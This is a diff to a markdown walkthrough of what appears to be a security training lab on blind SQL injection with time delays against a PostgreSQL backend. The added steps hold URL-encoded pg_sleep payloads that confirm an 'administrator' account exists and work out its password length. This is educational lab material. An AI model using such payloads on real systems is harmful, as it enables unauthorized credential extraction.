@@ -11,7 +11,7 @@ The database contains a different table called `users`, with columns called `use
 
 To solve the lab, log in as the `administrator` user.
 
-## Step to Reproduce
+## Steps to Reproduce
 
 ### Testing Entries
 
@@ -27,4 +27,26 @@ To solve the lab, log in as the `administrator` user.
 ```sql
 '%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 ```
+
+### Checking User
+
+- The below payload is used to determine whether the `administrator` user is present in the database of the application or not.
+
+```sql
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+### Finding Password Length
+
+- If the application takes `approx 10 seconds` to respond then the condition is true else false. So logically the first response from the server which will not take any time will indicate the password length.
+
+```sql
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+- The above payload results in no delay so the password length is `20`.
+
+
+
+
 
